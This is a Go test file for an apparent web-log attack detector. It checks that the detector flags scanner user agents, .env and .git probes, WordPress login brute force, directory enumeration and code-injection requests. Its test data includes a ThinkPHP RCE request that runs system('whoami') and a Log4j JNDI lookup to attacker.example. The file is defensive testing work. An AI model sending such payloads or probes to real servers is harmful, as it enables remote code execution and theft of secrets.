package attackwarn

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/suoten/serverguard/internal/storage"
	"github.com/suoten/serverguard/internal/types"
)

func mkAccessLine(ip, method, rawURL, status, ua string) string {
	return fmt.Sprintf(`%s - - [23/Aug/2026:20:00:00 +0800] "%s %s HTTP/1.1" %s 123 "-" "%s"`,
		ip, method, rawURL, status, ua)
}

func writeSiteLog(t *testing.T, dir string, lines []string) {
	t.Helper()
	content := ""
	for _, l := range lines {
		content += l + "\n"
	}
	if err := os.WriteFile(filepath.Join(dir, "www.test.com.log"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func scanDir(t *testing.T, dir string) []types.AttackEvent {
	t.Helper()
	store, err := storage.New(filepath.Join(dir, "test.db"))
	if err != nil {
		t.Fatalf("初始化测试存储失败: %v", err)
	}
	defer store.Close()

	g := NewAttackWarnGuard(store, nil)
	events, err := g.AnalyzeLogFiles(context.Background(), dir)
	if err != nil {
		t.Fatalf("AnalyzeLogFiles 返回错误: %v", err)
	}
	return events
}

func countType(events []types.AttackEvent, eventType string) int {
	n := 0
	for _, e := range events {
		if e.EventType == eventType {
			n++
		}
	}
	return n
}

// W10 扫描器探测：sqlmap/nikto 等工具 UA 必须被识别（宝塔恶意UA拦截对齐项）
func TestDetectScannerUAByUserAgent(t *testing.T) {
	dir := t.TempDir()
	writeSiteLog(t, dir, []string{
		mkAccessLine("203.0.113.10", "GET", "/", "200", "sqlmap/1.7.11#stable (http://sqlmap.org)"),
		mkAccessLine("203.0.113.11", "GET", "/", "404", "Nikto/2.5.0"),
		mkAccessLine("198.51.100.99", "GET", "/", "200", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0"),
	})

	events := scanDir(t, dir)
	if n := countType(events, "web_scanner"); n != 2 {
		t.Fatalf("扫描器探测事件应为 2，实际 %d（events=%v）", n, events)
	}
	for _, e := range events {
		if e.EventType == "web_scanner" && e.SourceIP == "198.51.100.99" {
			t.Fatal("正常浏览器 UA 被误判为扫描器")
		}
	}
}

// W11 敏感文件探测：.env / .git 泄露探测必须被识别
func TestDetectSensitiveProbe(t *testing.T) {
	dir := t.TempDir()
	browser := "Mozilla/5.0 (X11; Linux x86_64)"
	writeSiteLog(t, dir, []string{
		mkAccessLine("203.0.113.20", "GET", "/.env", "200", browser),
		mkAccessLine("203.0.113.20", "GET", "/.git/config", "200", browser),
		mkAccessLine("203.0.113.20", "GET", "/backup/db.sql.bak", "200", browser),
		mkAccessLine("203.0.113.21", "GET", "/", "200", browser),
	})

	events := scanDir(t, dir)
	if n := countType(events, "sensitive_probe"); n != 3 {
		t.Fatalf("敏感文件探测事件应为 3，实际 %d", n)
	}
}

// W11 编码变体：/%2Eenv 解码后同样要命中
func TestDetectSensitiveProbeURLEncoded(t *testing.T) {
	dir := t.TempDir()
	writeSiteLog(t, dir, []string{
		mkAccessLine("203.0.113.30", "GET", "/%2Eenv", "200", "curl/8.0"),
	})
	events := scanDir(t, dir)
	if n := countType(events, "sensitive_probe"); n != 1 {
		t.Fatalf("编码变体敏感文件探测未被识别: %d", n)
	}
}

// W12 代码执行：ThinkPHP RCE 与 Log4j JNDI 注入必须被识别为 critical
func TestDetectCodeInjection(t *testing.T) {
	dir := t.TempDir()
	browser := "Mozilla/5.0"
	writeSiteLog(t, dir, []string{
		mkAccessLine("203.0.113.40", "GET",
			`/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`,
			"200", browser),
		mkAccessLine("203.0.113.41", "GET", `/?x=${jndi:ldap://attacker.example/a}`, "200", browser),
	})

	events := scanDir(t, dir)
	if n := countType(events, "code_injection"); n != 2 {
		t.Fatalf("代码执行攻击事件应为 2，实际 %d（events=%v）", n, events)
	}
}

// W13 后台登录爆破：wp-login.php 高频 POST 必须聚合为一个爆破事件
func TestDetectCMSBruteForceOnWpLogin(t *testing.T) {
	dir := t.TempDir()
	var lines []string
	// 超过阈值 cmsBruteMinPosts=20，全部 401 失败（模拟暴破）
	for i := 0; i < 25; i++ {
		lines = append(lines, mkAccessLine("203.0.113.50", "POST", "/wp-login.php", "401", "Mozilla/5.0"))
	}
	writeSiteLog(t, dir, lines)

	events := scanDir(t, dir)
	if n := countType(events, "cms_bruteforce"); n != 1 {
		t.Fatalf("后台爆破事件应为 1（按 IP 聚合），实际 %d", n)
	}
}

// W13 阈值以下不误报：9 次登录 POST 属正常管理员行为
func TestNoCMSBruteForceBelowThreshold(t *testing.T) {
	dir := t.TempDir()
	var lines []string
	for i := 0; i < cmsBruteMinPosts-1; i++ {
		lines = append(lines, mkAccessLine("203.0.113.60", "POST", "/wp-login.php", "200", "Mozilla/5.0"))
	}
	writeSiteLog(t, dir, lines)

	events := scanDir(t, dir)
	if n := countType(events, "cms_bruteforce"); n != 0 {
		t.Fatalf("低于阈值的登录不应产生爆破事件，实际 %d", n)
	}
}

// W14 目录字典枚举：单 IP 大量不同 404 路径必须被识别
func TestDetectDirBruteForceByDistinct404(t *testing.T) {
	dir := t.TempDir()
	var lines []string
	for i := 0; i < dirBruteMinDistinct+5; i++ {
		lines = append(lines, mkAccessLine("203.0.113.70", "GET", fmt.Sprintf("/probe-%03d", i), "404", "Mozilla/5.0"))
	}
	writeSiteLog(t, dir, lines)

	events := scanDir(t, dir)
	if n := countType(events, "dir_bruteforce"); n != 1 {
		t.Fatalf("目录爆破探测事件应为 1，实际 %d", n)
	}
}

// 日志发现问题回归：超过旧上限 16 的目录中，最近活跃的站点日志必须被扫描到。
// 旧实现按文件名顺序截断前 16 个——排在末尾但最新更新的站点永远扫不到。
func TestAnalyzeLogFilesCoversRecentBeyondOldCap(t *testing.T) {
	dir := t.TempDir()
	old := time.Date(2026, 7, 1, 0, 0, 0, 0, time.UTC)

	payload := mkAccessLine("203.0.113.80", "GET", "/.env", "200", "Mozilla/5.0") + "\n"
	for i := 1; i <= 20; i++ {
		name := filepath.Join(dir, fmt.Sprintf("%02dsite.log", i))
		if err := os.WriteFile(name, []byte(""), 0644); err != nil {
			t.Fatal(err)
		}
		if err := os.Chtimes(name, old, old); err != nil {
			t.Fatal(err)
		}
	}
	target := filepath.Join(dir, "zzz-newest.log")
	if err := os.WriteFile(target, []byte(payload), 0644); err != nil {
		t.Fatal(err)
	}
	fresh := time.Date(2026, 8, 23, 21, 0, 0, 0, time.UTC)
	if err := os.Chtimes(target, fresh, fresh); err != nil {
		t.Fatal(err)
	}

	events := scanDir(t, dir)
	found := false
	for _, e := range events {
		if e.EventType == "sensitive_probe" && e.SourceIP == "203.0.113.80" {
			found = true
		}
	}
	if !found {
		t.Fatal("超出旧上限且按名排序靠后的最新活跃站点日志未被扫描 —— 日志发现问题回归")
	}
}
